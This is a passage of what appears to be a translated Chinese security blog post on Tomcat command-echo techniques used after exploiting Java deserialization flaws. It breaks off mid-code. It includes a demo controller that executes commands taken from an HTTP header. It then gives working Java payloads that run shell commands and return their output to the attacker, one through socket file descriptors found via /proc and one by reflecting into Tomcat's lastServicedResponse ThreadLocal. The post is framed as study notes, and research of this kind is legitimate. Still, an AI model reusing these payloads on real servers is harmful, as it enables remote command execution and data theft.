# Tomcat回显技术学习汇总
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x01 简介
2022年初打算把反序列化漏洞后利用技术给学习下，主要分为回显技术和内存马技术两大模块。因为之前对回显技术有所了解，就先把这块知识给弥补下。
## 0x02 搭建环境
采用简单的Spring-boot可以快速搭建web项目，并且使用Spring内置的轻量级Tomcat服务，虽然该Tomcat阉割了很多功能，但是基本够用。整个demo放在了github上，地址为
###  0x1 创建项目
选择Spring Initializr
###  0x2 添加代码
在项目的package中创建controller文件夹，并编写TestController类
    package com.example.tomcatresponselearn.controller;
    import org.springframework.stereotype.Controller;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.ResponseBody;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    @Controller
    @RequestMapping("/app")
    public class TestController {
        @RequestMapping("/test")
        @ResponseBody
        public String testDemo(String input, HttpServletResponse response) throws IOException {
            System.out.println(response);
            org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
            javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
            javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
            String cmd = httprequest.getHeader("cmd");
            if(cmd != null && !cmd.isEmpty()){
                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                try {
                    httpresponse.getWriter().printf(res);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return "Hello World!";
        }
    }
正常在编写Spring-boot代码的时候是不需要在testDemo函数中添加调用参数的。这里为了方便查看Response对象，因此在该函数上添加了HttpServletResponse。
###  0x3 添加Maven地址
在ubuntu上搭建环境的时候遇到了依赖包下载失败的情况。
添加如下仓库地址即可解决问题
    https://repo.maven.apache.org/maven2
## 0x03 各种回显技术
###  0x1 通过文件描述符回显
**1\. 简介**
2020年1月00theway师傅在《通杀漏洞利用回显方法-linux平台》文章中提出了一种回显思路
>
> 经过一段时间的研究发现了一种新的通杀的回显思路。在LINUX环境下，可以通过文件描述符”/proc/self/fd/i”获取到网络连接，在java中我们可以直接通过文件描述符获取到一个Stream对象，对当前网络连接进行读写操作，可以釜底抽薪在根源上解决回显问题。
简单来讲就是利用linux文件描述符实现漏洞回显。作为众多回显思路中的其中一种方法，虽然效果没有后两者的通用型强，但笔者打算学习下这种基于linux文件描述符的特殊利用姿势。
**2\. 可行性分析**
从理论上讲如果获取到了当前请求对应进程的文件描述符，如果输出描述符中写入内容，那么就会在回显中显示，从原理上是可行的，但在这个过程中主要有一个问题需要解决
  * 如何获得本次请求的文件描述符
解决这个问题就要思考在一次连接请求过程中有什么特殊的东西可通过代码识别出来，从而筛选出对应的请求信息。那么这个特殊的标识应该就是，客户端的访问ip地址了。
在/proc/net/tcp6文件中存储了大量的连接请求
其中local_address是服务端的地址和连接端口，remote_address是远程机器的地址和端口（客户端也在此记录），因此我们可以通过remote_address字段筛选出需要的inode号。这里的inode号会在/proc/xx/fd/中的socket一一对应
有了这个对应关系，我们就可以在/proc/xx/fd/目录中筛选出对应inode号的socket，从而获取了文件描述符。整体思路如下
  * 1.通过client ip在/proc/net/tcp6文件中筛选出对应的inode号
  * 2.通过inode号在/proc/$PPID/fd/中筛选出fd号
  * 3.创建FileDescriptor对象
  * 4.执行命令并向FileDescriptor对象输出命令执行结果
**3\. 代码编写**
**（1）获得本次请求的文件描述符**
    a=`cat /proc/$PPID/net/tcp6|awk '{if($10>0)print}'|grep -i %s|awk '{print $10}'`
    b=`ls -l /proc/$PPID/fd|grep 7200A8C0|awk '{print $9}'`
    echo -n $b
运行上述命令执行，并将结果存储在num中
    java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
    java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
    java.io.BufferedReader br = new java.io.BufferedReader(isr);
    StringBuilder stringBuilder = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null){
        stringBuilder.append(line);
    }
    int num = Integer.valueOf(stringBuilder.toString()).intValue();
**（2）执行命令并通过文件描述符输出**
    cmd = new String[]{"/bin/sh","-c","ls /"};
    in = Runtime.getRuntime().exec(cmd).getInputStream();//执行命令
    isr  = new java.io.InputStreamReader(in);
    br = new java.io.BufferedReader(isr);
    stringBuilder = new StringBuilder();
    while ((line = br.readLine()) != null){//读取命令执行结果
        stringBuilder.append(line);
    }
    String ret = stringBuilder.toString();
    java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});//获取构造器
    c.setAccessible(true);
    java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(num)}));//创建对象
    os.write(ret.getBytes());//向文件描述符中写入结果
    os.close();
**4\. 代码整合**
在实际使用过程中注意把客户端IP地址转换成16进制字节倒序，替换xxxx字符串。
    String[] cmd = { "/bin/sh", "-c", "a=`cat /proc/$PPID/net/tcp6|awk '{if($10>0)print}'|grep -i xxxx|awk '{print $10}'`;b=`ls -l /proc/$PPID/fd|grep $a|awk '{print $9}'`;echo -n $b"};
    java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
    java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
    java.io.BufferedReader br = new java.io.BufferedReader(isr);
    StringBuilder stringBuilder = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null){
        stringBuilder.append(line);
    }
    int num = Integer.valueOf(stringBuilder.toString()).intValue();
    cmd = new String[]{"/bin/sh","-c","ls /"};
    in = Runtime.getRuntime().exec(cmd).getInputStream();
    isr  = new java.io.InputStreamReader(in);
    br = new java.io.BufferedReader(isr);
    stringBuilder = new StringBuilder();
    while ((line = br.readLine()) != null){
        stringBuilder.append(line);
    }
    String ret = stringBuilder.toString();
    java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
    c.setAccessible(true);
    java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(num)}));
    os.write(ret.getBytes());
    os.close();
**5\. 局限性分析**
这种方法只适用于linux回显，并且在取文件描述符的过程中有可能会受到其他连接信息的干扰，一般不建议采取此方法进行回显操作，因为有下面两种更好的回显方式。
###  0x2 通过ThreadLocal Response回显
**1\. 简介**
2020年3月kingkk师傅提出一种基于调用栈中获取Response对象的方法，该方法主要是从ApplicationFilterChain中提取相关对象，因此如果对Tomcat中的Filter有部署上的变动的话就不能通过此方法实现命令回显。
仔细研读了kingkk师傅的思路，发现整个过程并不是很复杂，但前提是要先学会如何熟练使用Java
反射技术进行对象操作。寻找Response进行回显的大概思路如下
  * 1.通过翻阅函数调用栈寻找存储Response的类
  * 2.最好是个静态变量，这样不需要获取对应的实例，毕竟获取对象还是挺麻烦的
  * 3.使用ThreadLocal保存的变量，在获取的时候更加方便，不会有什么错误
  * 4.修复原有输出，通过分析源码找到问题所在
**2\. 代码分析**
师傅就是按照这个思路慢慢寻找，直到找到了保存在ApplicationFilterChain对象中的静态变量lastServicedResponse
在internalDoFilter函数中有对该ThreadLocal变量赋值的操作
但是通过分析代码发现，改变量在初始化运行的时候就已经被设置为null了，这就需要通过反射的方式让lastServiceResponse进行初始化。
在使用response的getWriter函数时，usingWriter
变量就会被设置为true。如果在一次请求中usingWriter变为了true那么在这次请求之后的结果输出时就会报错
报错内容如下，getWriter已经被调用过一次
那么在代码设计的时候也要解决这个问题，才能把原有的内容通过http返回包输出来。
通过分析得到其具体实施步骤为
  * 1.使用反射把ApplicationDispathcer.WRAP_SAME_OBJECT变量修改为true
  * 2.使用反射初始化ApplicationDispathcer中的lastServicedResponse变量为ThreadLocal
  * 3.使用反射从lastServicedResponse变量中获取tomcat Response变量
  * 4.使用反射修复输出报错
**3\. 代码编写**
**（1）ApplicationDispathcer.WRAP_SAME_OBJECT变量修改为true**  
通过上面的需求，编写对应的代码进行实现，需要提前说明的是WRAP_SAME_OBJECT、lastServicedRequest、lastServicedResponse为static
final变量，而且后两者为私有变量，因此需要modifiersField的处理将FINAL属性取消掉。
相对应的实现代码如下
    Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");//获取WRAP_SAME_OBJECT字段
    Field modifiersField = Field.class.getDeclaredField("modifiers");//获取modifiers字段
    modifiersField.setAccessible(true);//将变量设置为可访问
    modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);//取消FINAL属性
    WRAP_SAME_OBJECT_FIELD.setAccessible(true);//将变量设置为可访问
    WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);//将变量设置为true
**（2）初始化ApplicationDispathcer中的lastServicedResponse变量为ThreadLocal**  
这里需要把lastServicedResponse和lastServiceRequest，因为如果这两个其中之一的变量为初始化就会在set的地方报错。
相对应的实现代码如下
    Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");//获取lastServicedRequest变量
    Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");//获取lastServicedResponse变量
    modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);//取消FINAL属性
    modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);//取消FINAL属性
    lastServicedRequestField.setAccessible(true);//将变量设置为可访问
    lastServicedResponseField.setAccessible(true);//将变量设置为可访问
    lastServicedRequestField.set(null, new ThreadLocal<>());//设置ThreadLocal对象
    lastServicedResponseField.set(null, new ThreadLocal<>());//设置ThreadLocal对象
这里仅仅实现了如何初始化lastServicedRequest和lastServicedResponse这两个变量为ThreadLocal。在实际实现过程中需要添加判断，如果lastServicedRequest存储的值不是null那么就不要进行初始化操作。  
 **（3）从lastServicedResponse变量中获取tomcat Response变量**  
从上面代码中的lastServicedResponseField直接获取lastServicedResponse变量，因为这时的lastServicedResponse变量为ThreadLocal变量，可以直接通过get方法获取其中存储的变量。
    ThreadLocal lastServicedResponse =           (ThreadLocal) lastServicedResponseField.get(null);//获取lastServicedResponse变量
    ServletResponse responseFacade = lastServicedResponse.get();//获取lastServicedResponse中存储的变量
**（4）修复输出报错**  
可以在调用getWriter函数之后，通过反射修改usingWriter变量值。
    Field responseField = ResponseFacade.class.getDeclaredField("response");//获取response字段
    responseField.setAccessible(true);//将变量设置为可访问
    Response response = (Response) responseField.get(responseFacade);//获取变量
    Field usingWriter = Response.class.getDeclaredField("usingWriter");//获取usingWriter字段
    usingWriter.setAccessible(true);//将变量设置为可访问
    usingWriter.set((Object) response, Boolean.FALSE);//设置usingWriter为false
果然在添加过这个代码之后就没有任何问题了。
**4\. 代码整合**
搬运kingkk师傅代码供大家参考
    Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
    Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
    Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
    Field modifiersField = Field.class.getDeclaredField("modifiers");
    modifiersField.setAccessible(true);
    modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
    modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
    modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
    WRAP_SAME_OBJECT_FIELD.setAccessible(true);
    lastServicedRequestField.setAccessible(true);
    lastServicedResponseField.setAccessible(true);
    ThreadLocal lastServicedResponse =
        (ThreadLocal) lastServicedResponseField.get(null);
    ThreadLocal lastServicedRequest = (ThreadLocal) lastServicedRequestField.get(null);
    boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
    String cmd = lastServicedRequest != null
        ? lastServicedRequest.get().getParameter("cmd")
        : null;
    if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {